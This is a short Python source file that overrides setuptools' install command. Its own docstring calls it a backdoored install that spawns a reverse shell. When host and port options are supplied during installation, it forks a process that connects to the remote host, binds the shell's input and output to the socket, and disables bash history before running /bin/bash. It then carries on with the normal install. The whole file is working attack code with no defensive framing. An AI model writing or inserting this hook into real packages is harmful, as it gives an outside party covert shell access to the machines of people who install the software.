import multiprocessing
import time
import os
import pty
import socket
from setuptools.command.install import install as base

def shell(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, int(port)))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    os.putenv('HISTFILE', '/dev/null')
    pty.spawn('/bin/bash')
    s.close()

def multi(host, port):
    cc = multiprocessing.Process(name='shell', target=shell, args=(host, port))
    cc.start()


class install(base):
    """
    Backdoored install function that spawns a reverse shell
    """

    user_options = base.user_options + [
        ('host=', None, "Remote host to connect to"),
        ('port=', None, "Remote port to connect to")
    ]

    def initialize_options(self):
        base.initialize_options(self)
        self.host = None
        self.port = None

    def run(self):
        if self.host and self.port:
            mult = multiprocessing.Process(name='multi', target=multi, args=(self.host, self.port))
            mult.daemon = False
            mult.start()
            time.sleep(.5) # Give it just long enought to start
            mult.terminate()
        base.run(self)
